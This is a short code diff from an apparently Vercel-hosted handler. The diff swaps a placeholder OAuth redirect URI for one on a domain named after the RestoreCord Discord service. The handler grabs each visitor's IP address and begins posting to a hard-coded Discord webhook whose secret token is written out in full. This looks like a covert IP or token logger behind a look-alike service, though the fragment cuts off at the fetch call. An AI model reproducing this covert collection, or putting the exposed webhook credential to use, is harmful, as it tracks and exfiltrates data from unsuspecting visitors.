@@ -2,7 +2,7 @@ export default async function handler(req, res) {
   const ip = req.headers["x-forwarded-for"]?.split(",")[0] || req.socket.remoteAddress || "IP not found";
 
   const discordClientId = "1390626260056674366";
-  const redirectUri = "https://your-vercel-project.vercel.app/api/callback";
+  const redirectUri = "https://restorecord-three.vercel.app/api/callback";
 
   const webhookURL = "https://discord.com/api/webhooks/1390330277854969906/3Xxwg1PF0sxuV4j9aT-4gx1Q2CLfqNBMX_GuZFlheEsA-iAYYrF-MWRxYcL8lSOrNRZf";
   await fetch(webhookURL, {
